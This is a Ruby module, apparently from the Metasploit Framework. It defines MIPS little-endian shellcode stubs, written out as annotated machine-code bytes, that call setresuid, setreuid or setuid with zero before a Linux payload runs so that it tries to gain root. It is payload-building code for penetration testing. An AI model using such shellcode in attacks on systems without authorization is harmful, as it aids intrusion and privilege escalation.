#
# Linux mipsle prepends
#
module Msf::Payload::Linux::Mipsle::Prepends
  include Msf::Payload::Linux::Prepends

  def prepends_order
    %w[PrependSetresuid PrependSetreuid PrependSetuid]
  end

  def appends_order
    %w[]
  end

  def prepends_map
    {
      # setresuid(0, 0, 0)
      'PrependSetresuid' => "\xff\xff\x04\x28" + #    slti  a0, zero, -1  (a0 = 0)     #
        "\xff\xff\x05\x28" + #    slti  a1, zero, -1  (a1 = 0)     #
        "\xff\xff\x06\x28" + #    slti  a2, zero, -1  (a2 = 0)     #
        "\x59\x10\x02\x24" + #    li    v0, 4185      (__NR_setresuid) #
        "\x0c\x01\x01\x01", #    syscall 0x40404                  #

      # setreuid(0, 0)
      'PrependSetreuid' => "\xff\xff\x04\x28" + #    slti  a0, zero, -1  (a0 = 0)     #
        "\xff\xff\x05\x28" + #    slti  a1, zero, -1  (a1 = 0)     #
        "\xe6\x0f\x02\x24" + #    li    v0, 4070      (__NR_setreuid) #
        "\x0c\x01\x01\x01", #    syscall 0x40404                  #

      # setuid(0)
      'PrependSetuid' => "\xff\xff\x04\x28" + #    slti  a0, zero, -1  (a0 = 0)     #
        "\xb7\x0f\x02\x24" + #    li    v0, 4023      (__NR_setuid) #
        "\x0c\x01\x01\x01", #    syscall 0x40404                  #
    }
  end

  def appends_map
    {}
  end
end
